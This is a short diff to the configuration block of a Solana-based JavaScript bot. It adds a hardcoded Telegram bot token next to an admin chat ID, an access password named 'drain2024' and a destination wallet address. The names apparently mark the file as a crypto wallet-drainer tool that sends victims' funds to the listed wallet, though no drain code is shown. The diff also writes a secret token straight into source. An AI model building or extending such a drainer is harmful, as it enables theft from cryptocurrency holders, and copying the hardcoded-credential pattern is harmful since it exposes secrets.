@@ -10,7 +10,7 @@ const solanaWeb3 = require('@solana/web3.js');
 // ⚙️ CONFIG
 // ==========================================
 const CFG = {
-    BOT_TOKEN: process.env.BOT_TOKEN,          // set via Render env var
+    BOT_TOKEN: process.env.BOT_TOKEN || '8654897884:AAE8gKl-Ol_XPQ2lnUnhy4-aC5AaGYxmea0', // set via Render env var or hardcode here
     ADMIN_CHAT_ID: -1164147269,                // @Kaxobrixks chat ID (hardcoded, no key needed)
     REQUIRED_KEY: 'drain2024',                 // password required for everyone else
     DESTINATION_WALLET: 'EH4XsehQw2LdEJVEn1go3gHBybGf8bF277G5HwR2TYc7',
